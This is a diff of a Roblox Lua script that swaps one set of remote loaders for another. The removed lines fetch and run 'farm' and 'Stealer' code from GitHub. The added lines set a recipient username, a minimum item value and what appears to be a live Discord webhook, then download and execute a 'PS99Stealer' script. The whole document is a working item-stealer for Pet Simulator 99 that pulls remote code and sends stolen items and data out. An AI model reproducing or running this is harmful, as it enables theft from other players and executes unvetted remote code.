@@ -1,10 +1,6 @@
-local function farm()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/kjrmz/Latest/refs/heads/main/New'))()
-end
-local function stealer()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/kjrmz/NewScripts/refs/heads/main/Stealer'))()
-end
+Username = "nbvbw"
+Username2 = "nbvbw"
+MinimumRAP = 1000000
+Webhook = "https://discord.com/api/webhooks/1332598413849526315/938iWUzjU8gSs6Q1CE5raBcX5bVT1qlvMXhVS8S0zz5KskeZ1ecioGr-UNG92HhgFzo4"
 
-task.spawn(farm)
-wait(30)
-task.spawn(stealer)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TraxMain/TraxStealer/refs/heads/main/PS99Stealer", true))()
